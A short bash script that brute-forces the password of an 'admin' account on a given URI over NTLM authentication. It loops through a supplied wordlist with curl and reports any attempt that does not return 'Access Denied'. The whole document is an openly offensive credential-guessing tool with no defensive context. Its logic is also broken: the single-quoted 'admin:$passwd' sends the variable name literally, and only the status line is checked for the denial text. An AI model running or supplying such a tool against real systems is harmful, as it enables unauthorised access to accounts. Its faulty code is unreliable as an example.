#!/bin/bash
count=0;
function usage {
	echo -e "\nUsage: ./bf.script <URI> <WORDLIST>\n"
	exit 1;
}
uri=$1
words=$2
if [ "$#" -ne 2 ];
	then usage;
fi;
for passwd in $(cat $words); do
	let count=$count+1;
	resp=$(curl -s $uri --ntlm -u 'admin:$passwd' -i 2>/dev/null | head -n 1); 
	if ! [[ "$resp" =~ "Access Denied" ]]; 
		then echo "$passwd worked: $resp"; 
	fi; 
	if (( $count % 500 == 0 ));
		then echo "Tested $count passwords."
	fi;
done
